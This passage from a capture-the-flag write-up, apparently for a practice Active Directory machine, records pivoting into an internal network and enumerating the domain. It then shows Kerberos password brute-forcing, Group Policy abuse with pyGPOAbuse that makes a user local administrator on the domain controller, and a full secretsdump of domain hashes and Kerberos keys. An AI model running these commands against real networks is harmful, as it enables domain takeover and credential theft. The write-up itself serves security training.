tcp        0      0 drip.darkcorp.htb:58590 10.10.14.199:11601      ESTABLISHED
tcp        0      0 drip.darkcorp.htb:44322 DC-01:593               ESTABLISHED
tcp        0      0 localhost:postgresql    localhost:58656         TIME_WAIT  
udp        0      0 drip.darkcorp.htb:53088 DC-01:domain            ESTABLISHED
udp        0      0 drip.darkcorp.htb:38815 DC-01:domain            ESTABLISHED
udp        0      0 drip.darkcorp.htb:53206 DC-01:domain            ESTABLISHED
udp        0      0 drip.darkcorp.htb:49123 DC-01:domain            ESTABLISHED
udp        0      0 drip.darkcorp.htb:34817 DC-01:domain            ESTABLISHED
udp        0      0 drip.darkcorp.htb:50254 DC-01:domain            ESTABLISHED
udp        0      0 drip.darkcorp.htb:53840 DC-01:domain            ESTABLISHED
udp        0      0 drip.darkcorp.htb:36959 DC-01:domain            ESTABLISHED
udp        0      0 drip.darkcorp.htb:54892 DC-01:domain            ESTABLISHED
udp        0      0 drip.darkcorp.htb:33966 DC-01:domain            ESTABLISHED
udp        0      0 drip.darkcorp.htb:43201 DC-01:domain            ESTABLISHED
udp        0      0 drip.darkcorp.htb:34577 DC-01:domain            ESTABLISHED
udp        0      0 drip.darkcorp.htb:45842 DC-01:domain            ESTABLISHED
```

## network pivoting with ligolo-ng

- the ebelford linux machine network has access to an intranet 172.16.20.0/24

- to make a pivot I tried several ways listed here https://swisskyrepo.github.io/InternalAllTheThings/redteam/pivoting/network-pivoting-techniques/ but most of them didn't work, only with ligolo

- follow quickstart steps to setup ligolo client and server https://github.com/nicocha30/ligolo-ng/wiki/Quickstart

```
Nmap scan report for 172.16.20.1
Host is up (0.84s latency).
Not shown: 985 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
443/tcp  open  https
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
2179/tcp open  vmrdp
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl

Nmap scan report for 172.16.20.2
Host is up (0.49s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
5000/tcp open  upnp

Nmap scan report for 172.16.20.3
Host is up (0.77s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http


172.16.20.1 = DC-01.darkcorp.htb
172.16.20.2 = WEB-01.darkcorp.htb
```

## netexec enum with victor.r creds (obtained before in postgres backup file)

```
└─$ netexec smb 172.16.20.1 -u victor.r -p 'victor1gustavo@#'
SMB         172.16.20.1     445    DC-01            [*] Windows Server 2022 Build 20348 x64 (name:DC-01) (domain:darkcorp.htb) (signing:True) (SMBv1:False)
SMB         172.16.20.1     445    DC-01            [+] darkcorp.htb\victor.r:victor1gustavo@# 
```

```
└─$ netexec smb 172.16.20.1 -u victor.r -p 'victor1gustavo@#' --users 
SMB         172.16.20.1     445    DC-01            [*] Windows Server 2022 Build 20348 x64 (name:DC-01) (domain:darkcorp.htb) (signing:True) (SMBv1:False)
SMB         172.16.20.1     445    DC-01            [+] darkcorp.htb\victor.r:victor1gustavo@# 
SMB         172.16.20.1     445    DC-01            -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         172.16.20.1     445    DC-01            Administrator                 2024-12-29 23:25:45 0       Built-in account for administering the computer/domain 
SMB         172.16.20.1     445    DC-01            Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         172.16.20.1     445    DC-01            krbtgt                        2024-12-29 23:29:05 0       Key Distribution Center Service Account 
SMB         172.16.20.1     445    DC-01            victor.r                      2025-01-06 16:53:19 0        
SMB         172.16.20.1     445    DC-01            svc_acc                       2024-12-29 23:39:38 0        
SMB         172.16.20.1     445    DC-01            john.w                        2024-12-29 23:39:48 0        
SMB         172.16.20.1     445    DC-01            angela.w                      2024-12-29 23:39:57 0        
SMB         172.16.20.1     445    DC-01            angela.w.adm                  2024-12-29 23:39:57 0        
SMB         172.16.20.1     445    DC-01            taylor.b                      2025-01-09 16:10:33 0        
SMB         172.16.20.1     445    DC-01            taylor.b.adm                  2025-01-08 21:55:01 0        
SMB         172.16.20.1     445    DC-01            eugene.b                      2025-02-03 17:30:41 0        
SMB         172.16.20.1     445    DC-01            bryce.c                       2025-02-03 17:31:26 0        
SMB         172.16.20.1     445    DC-01            [*] Enumerated 12 local users: darkcorp
```                                                                                                

```
└─$ netexec smb 172.16.20.1 -u victor.r -p 'victor1gustavo@#' --groups | grep -v "membercount: 0"
SMB                      172.16.20.1     445    DC-01            [*] Windows Server 2022 Build 20348 x64 (name:DC-01) (domain:darkcorp.htb) (signing:True) (SMBv1:False)
SMB                      172.16.20.1     445    DC-01            [+] darkcorp.htb\victor.r:victor1gustavo@# 
SMB                      172.16.20.1     445    DC-01            [+] Enumerated domain group(s)
SMB                      172.16.20.1     445    DC-01            gpo_manager                              membercount: 1
SMB                      172.16.20.1     445    DC-01            linux_admins                             membercount: 2
SMB                      172.16.20.1     445    DC-01            DnsAdmins                                membercount: 1
SMB                      172.16.20.1     445    DC-01            Denied RODC Password Replication Group   membercount: 8
SMB                      172.16.20.1     445    DC-01            Windows Authorization Access Group       membercount: 1
SMB                      172.16.20.1     445    DC-01            Pre-Windows 2000 Compatible Access       membercount: 2
SMB                      172.16.20.1     445    DC-01            Group Policy Creator Owners              membercount: 1
SMB                      172.16.20.1     445    DC-01            Domain Admins                            membercount: 1
SMB                      172.16.20.1     445    DC-01            Cert Publishers                          membercount: 1
SMB                      172.16.20.1     445    DC-01            Enterprise Admins                        membercount: 1
SMB                      172.16.20.1     445    DC-01            Schema Admins                            membercount: 1
SMB                      172.16.20.1     445    DC-01            Remote Management Users                  membercount: 1
SMB                      172.16.20.1     445    DC-01            Certificate Service DCOM Access          membercount: 1
SMB                      172.16.20.1     445    DC-01            Guests                                   membercount: 2
SMB                      172.16.20.1     445    DC-01            Users                                    membercount: 3
SMB                      172.16.20.1     445    DC-01            Administrators                           membercount: 3
```


- after some issues with dns timeout and resolving... use dnschef to spoof all dns queries to 172.16.20.1 AD dns resolve for collect bloodhound info.
- https://github.com/iphelix/dnschef

```
└─$ ./dnschef.py --fakeip 172.16.20.1 --nameserver 172.16.20.1

└─$ netexec ldap dc-01.darkcorp.htb -u victor.r -p 'victor1gustavo@#' --dns-server 127.0.0.1 --bloodhound --collection All  
SMB         172.16.20.1     445    DC-01            [*] Windows Server 2022 Build 20348 x64 (name:DC-01) (domain:darkcorp.htb) (signing:True) (SMBv1:False)
LDAP        172.16.20.1     389    DC-01            [+] darkcorp.htb\victor.r:victor1gustavo@# 
LDAP        172.16.20.1     389    DC-01            Resolved collection methods: dcom, acl, session, container, objectprops, rdp, group, psremote, trusts, localadmin
LDAP        172.16.20.1     389    DC-01            Done in 01M 12S
LDAP        172.16.20.1     389    DC-01            Compressing output into /home/kalibox/.nxc/logs/DC-01_172.16.20.1_2025-02-16_001641_bloodhound.zip
```

## BloodHound data

```
- victor.r ---> no outbound info

- svc_acc ---> MemberOf ---> DnsAdmins
  |__ no out or inbound

- eugene.b ---> no out or inbound

- bryce.c ---> no out or inbound

- john.w ---> GenericAll over ---> angela.w  

- angela.w ---> no out or inbound

- angela.w.adm ---> MemberOf ---> Linux_Admins
  |__ no out or inbound

- taylor.b ---> no out or inbound

- taylor.b.adm ---> MemberOf ---> Remote Management users, Linux_Admins, Gpo_Manager
  |__ Outbound ---> Gpo_manager members has ---> GenericWrite, WriteDacl, WriteOwner over ---> GPO SECURITYUPDATES


- GPO SECURITYUPDATES ---> GPlink ---> Domain Controllers

The GPO SECURITYUPDATES@DARKCORP.HTB is linked to the OU DOMAIN CONTROLLERS@DARKCORP.HTB.
A linked GPO applies its settings to objects in the linked container.
- Windows
With full control of a GPO, you may make modifications to that GPO which will then apply to the users and computers affected by the GPO. Select the target object you wish to push an evil policy down to, then use the gpedit GUI to modify the GPO, using an evil policy that allows item-level targeting, such as a new immediate scheduled task. Then wait for the group policy client to pick up and execute the new evil policy. See the references tab for a more detailed write up on this abuse.
- Linux 
With full control of a GPO, you may make modifications to that GPO which will then apply to the users and computers affected by the GPO. Select the target object you wish to push an evil policy down to, then use the gpedit GUI to modify the GPO, using an evil policy that allows item-level targeting, such as a new immediate scheduled task. Then wait at least 2 hours for the group policy client to pick up and execute the new evil policy. See the references tab for a more detailed write up on this abuse.
pyGPOAbuse.py can be used for that purpose.
https://wald0.com/?p=179
https://blog.cptjesus.com/posts/bloodhound15


OU DOMAIN CONTROLLERS@DARKCORP.HTB contains the computer DC-01.DARKCORP.HTB.
Permissions on the parent of a child object may enable compromise of the child object through inherited ACEs or linked GPOs.

  Gpcpath:
\\DARKCORP.HTB\SYSVOL\DARKCORP.HTB\POLICIES\{652CAE9A-4BB7-49F2-9E52-3361F33CE786}

Distinguished Name:
CN={652CAE9A-4BB7-49F2-9E52-3361F33CE786},CN=POLICIES,CN=SYSTEM,DC=DARKCORP,DC=HTB

Object ID:
7FAA32FE-1079-49B3-A926-F7E46FA79E4B
```

- It seems that only the user taylor.b.adm has a outbound path to admin


## taylor.b.adm

```
└─$ ./kerbrute bruteuser -v --dc 172.16.20.1 -d darkcorp.htb /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt taylor.b.adm


[+] VALID LOGIN:  taylor.b.adm@darkcorp.htb:!QAZzaq1
```


#### GPO perms abuse 

- https://medium.com/@ericwsound/gpo-abuse-privilege-escalation-to-local-admin-cb212a1b4fdc
- https://www.thehacker.recipes/ad/movement/group-policies
- https://www.synacktiv.com/publications/gpoddity-exploiting-active-directory-gpos-through-ntlm-relaying-and-more
- https://github.com/Hackndo/pyGPOAbuse


- user taylor.b.adm is part of "remote user management" so i can log in via winrm, but doing things locally didn't work because windows defender is enabled

```
*Evil-WinRM* PS C:\Users\taylor.b.adm\Desktop> .\SharpGPOAbuse.exe
Program 'SharpGPOAbuse.exe' failed to run: Operation did not complete successfully because the file contains a virus or potentially unwanted softwareAt line:1 char:1
```

#### abuing gpo with pyGPOAbuse, adding victor.r to administrator group

```
└─$ python3 pygpoabuse.py 'darkcorp.htb/taylor.b.adm:!QAZzaq1' -gpo-id '652CAE9A-4BB7-49F2-9E52-3361F33CE786' -command 'net localgroup administrators victor.r /add' -v -dc-ip 172.16.20.1
INFO:root:Version updated
[*] Version updated
SUCCESS:root:ScheduledTask TASK_1de7be0c created!
[+] ScheduledTask TASK_1de7be0c created!
```

```
*Evil-WinRM* PS C:\Users\taylor.b.adm\Documents> net localgroup Administrators
Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
Domain Admins
Enterprise Admins
victor.r
The command completed successfully.
```

```
└─$ impacket-secretsdump 'darkcorp.htb.htb/victor.r:victor1gustavo@#@172.16.20.1'                           
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xe7c8f385f342172c7b0267fe4f3cbbd6
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fcb3ca5a19a1ccf2d14c13e8b64cde0f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
darkcorp\DC-01$:aes256-cts-hmac-sha1-96:23f8c53f91fd2035d0dc5163341bd883cc051c1ba998f5aed318cd0d820fa1b2
darkcorp\DC-01$:aes128-cts-hmac-sha1-96:2715a4681263d6f9daf03b7dd7065a23
darkcorp\DC-01$:des-cbc-md5:eca71034201a3826
darkcorp\DC-01$:plain_password_hex:90d17589c9c348f3ea541982f161b1f658cec76e33e32762cba25cf55643a853efd93dd5cffec0cba16e008a2c7112715437d6a33b72e28405c53f68965349b0676128c9cb1997717523971bdaf255f72d9664d3ed5c06f1e5eb3a5b2ef6dc435727ed160e340591724e1230782e2484e25f8484a7b21bf102f71c9a91219cc23743377526a9c73eec8a70def939e673dd244d21be9ec18ba0d915bc080e8bfb3ac8953b5c6e64adb1107b062ddad75ce0e1f805bcdb52de979599787fac9d8246807055b4671191a41804f7918da2b82e3a4fde2959cd227a8af08982a89bcc7437e13426e8ff74273c4e0538a65eeb
darkcorp\DC-01$:aad3b435b51404eeaad3b435b51404ee:45d397447e9d8a8c181655c27ef31d28:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x395bad4405a9fd2285737a8ce7c6d9d60e6fceb3
dpapi_userkey:0x3f426bba655ad645920a84d740836ed1edf35836
[*] NL$KM 
 0000   65 DB D5 E7 F9 08 5C 24  AB 45 B5 E5 5D E5 3F DD   e.....\$.E..].?.
 0010   89 93 2A C7 F3 70 1E 5A  B7 8D 4E D3 BA 3B 5F 0C   ..*..p.Z..N..;_.
 0020   A9 FC 32 69 57 6D E6 78  D0 07 33 43 FE 1E 06 A6   ..2iWm.x..3C....
 0030   1E 56 2C 27 91 47 56 54  91 0D 20 79 E7 7A 2F 95   .V,'.GVT.. y.z/.
NL$KM:65dbd5e7f9085c24ab45b5e55de53fdd89932ac7f3701e5ab78d4ed3ba3b5f0ca9fc3269576de678d0073343fe1e06a61e562c2791475654910d2079e77a2f95
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fcb3ca5a19a1ccf2d14c13e8b64cde0f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7c032c3e2657f4554bc7af108bd5ef17:::
victor.r:1103:aad3b435b51404eeaad3b435b51404ee:06207752633f7509f8e2e0d82e838699:::
svc_acc:1104:aad3b435b51404eeaad3b435b51404ee:01f55ea10774cce781a1b172478fcd25:::
john.w:1105:aad3b435b51404eeaad3b435b51404ee:b31090fdd33a4044cd815558c4d05b04:::
angela.w:1106:aad3b435b51404eeaad3b435b51404ee:957246c8137069bca672dc6aa0af7c7a:::
angela.w.adm:1107:aad3b435b51404eeaad3b435b51404ee:cf8b05d0462fc44eb783e3f423e2a138:::
taylor.b:1108:aad3b435b51404eeaad3b435b51404ee:ab32e2ad1f05dab03ee4b4d61fcb84ab:::
taylor.b.adm:14101:aad3b435b51404eeaad3b435b51404ee:0577b4b3fb172659dbac0be4554610f8:::
darkcorp.htb\eugene.b:25601:aad3b435b51404eeaad3b435b51404ee:84d9acc39d242f951f136a433328cf83:::
darkcorp.htb\bryce.c:25603:aad3b435b51404eeaad3b435b51404ee:5aa8484c54101e32418a533ad956ca60:::
DC-01$:1000:aad3b435b51404eeaad3b435b51404ee:45d397447e9d8a8c181655c27ef31d28:::
DRIP$:1601:aad3b435b51404eeaad3b435b51404ee:fa133329576858e48f4e1a8de10d7f56:::
WEB-01$:20601:aad3b435b51404eeaad3b435b51404ee:8f33c7fc7ff515c1f358e488fbb8b675:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:97064b5e2ed9569a7a61cb6e71fd624e20de8464fc6d3f7f9c9ccd5ec865cd05
Administrator:aes128-cts-hmac-sha1-96:0424167c3041ed3b8df4ab1c996690c1
Administrator:des-cbc-md5:a1b004ad46dc19d9
krbtgt:aes256-cts-hmac-sha1-96:2795479225a152c8958119e8549079f2a59e101d84a3e464603a9cced55580d6
krbtgt:aes128-cts-hmac-sha1-96:183ebcd77ae33f476eb13c3f4404b98d
krbtgt:des-cbc-md5:7fe9e5ad67524001
victor.r:aes256-cts-hmac-sha1-96:84e79cb6b8959ebdda0dc73d2c6728bb9664d0d75c2aef702b0ea0a4126570bb
victor.r:aes128-cts-hmac-sha1-96:bc1fa04172b62be4428af05dcd4941af
victor.r:des-cbc-md5:62491fa740918316
svc_acc:aes256-cts-hmac-sha1-96:21ebfe2a41e5d614795ef004a06135748d5af03d0f2ca7fd6f6d804ac00f759a
svc_acc:aes128-cts-hmac-sha1-96:aebdba02d03943f17f553495f5f5e1d1
svc_acc:des-cbc-md5:5bec0bb54a405ed9
john.w:aes256-cts-hmac-sha1-96:6c0d89a7461f21150bbab0e4c9dea04ca4feb27a4f432c95030dbfa17f4f7de5
john.w:aes128-cts-hmac-sha1-96:16da7304c10a476b10a0ad301f858826
john.w:des-cbc-md5:e90b041f52b30875
angela.w:aes256-cts-hmac-sha1-96:25f7053fcfb74cf4f02dab4b2c7cb1ae506f3c3c09e4a5b7229b9f21a761830a
angela.w:aes128-cts-hmac-sha1-96:15f1467015c7cdd49ef74fd2fe549cf3
angela.w:des-cbc-md5:5b0168dacbc22a5e
angela.w.adm:aes256-cts-hmac-sha1-96:bec3236552b087f396597c10431e9a604be4b22703d37ae45cde6cd99873c693
angela.w.adm:aes128-cts-hmac-sha1-96:994dccb881c6a80c293cac8730fd18a2
angela.w.adm:des-cbc-md5:cb0268169289bfd9
taylor.b:aes256-cts-hmac-sha1-96:b269239174e6de5c93329130e77143d7a560f26938c06dae8b82cae17afb809c
taylor.b:aes128-cts-hmac-sha1-96:a3f7e9307519e6d3cc8e4fba83df0fef
taylor.b:des-cbc-md5:9b8010a21f1c7a3d
taylor.b.adm:aes256-cts-hmac-sha1-96:4c1e6783666861aac09374bee2bc48ba5ad331f3ac87e067c4a330c6a31dd71a
taylor.b.adm:aes128-cts-hmac-sha1-96:85712fd85df4669be88350520651cfe2
taylor.b.adm:des-cbc-md5:ce6176f4f4e5cd9e
darkcorp.htb\eugene.b:aes256-cts-hmac-sha1-96:33e0cf90ad3c5d0cd264207421c506b56b8ca9703b5be8c58a97169851067fd1
darkcorp.htb\eugene.b:aes128-cts-hmac-sha1-96:adf8b2743349be9684f8ec27df53fa92
darkcorp.htb\eugene.b:des-cbc-md5:2f5ef4b06b231afd
darkcorp.htb\bryce.c:aes256-cts-hmac-sha1-96:e835ec6b7d680472bdf65ac11ec17395930b5d778ba08481ef7290616b1fa7a8
darkcorp.htb\bryce.c:aes128-cts-hmac-sha1-96:09b1a46858723452ce11da2335b602b0
darkcorp.htb\bryce.c:des-cbc-md5:26d55b5849b6e623
DC-01$:aes256-cts-hmac-sha1-96:23f8c53f91fd2035d0dc5163341bd883cc051c1ba998f5aed318cd0d820fa1b2
DC-01$:aes128-cts-hmac-sha1-96:2715a4681263d6f9daf03b7dd7065a23
DC-01$:des-cbc-md5:8038f74f7c0da1b5
DRIP$:aes256-cts-hmac-sha1-96:d32d67eea4e966dc11e9c8d2f095c139f00c599bed754a97281ed8003536cf38
DRIP$:aes128-cts-hmac-sha1-96:4f5a85a6241541fb066c57d3ca7ae9d7
DRIP$:des-cbc-md5:13e52519612f1532
WEB-01$:aes256-cts-hmac-sha1-96:f16448747d7df00ead462e40b26561ba01be87d83068ef0ed766ec8e7dd2a12e
WEB-01$:aes128-cts-hmac-sha1-96:7867cb5a59da118ad045a5da54039eae
WEB-01$:des-cbc-md5:38e00bb3d901eaef
```

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami /all

USER INFORMATION
----------------

User Name              SID
====================== =============================================
darkcorp\administrator S-1-5-21-3432610366-2163336488-3604236847-500


GROUP INFORMATION
-----------------

Group Name                                      Type             SID                                           Attributes
=============================================== ================ ============================================= ===============================================================
Everyone                                        Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                          Alias            S-1-5-32-544                                  Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Users                                   Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access      Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access         Alias            S-1-5-32-574                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                            Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users                Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                  Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
darkcorp\Domain Admins                          Group            S-1-5-21-3432610366-2163336488-3604236847-512 Mandatory group, Enabled by default, Enabled group
darkcorp\Group Policy Creator Owners            Group            S-1-5-21-3432610366-2163336488-3604236847-520 Mandatory group, Enabled by default, Enabled group
darkcorp\Schema Admins                          Group            S-1-5-21-3432610366-2163336488-3604236847-518 Mandatory group, Enabled by default, Enabled group
darkcorp\Enterprise Admins                      Group            S-1-5-21-3432610366-2163336488-3604236847-519 Mandatory group, Enabled by default, Enabled group
darkcorp\Denied RODC Password Replication Group Alias            S-1-5-21-3432610366-2163336488-3604236847-572 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication                Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level            Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```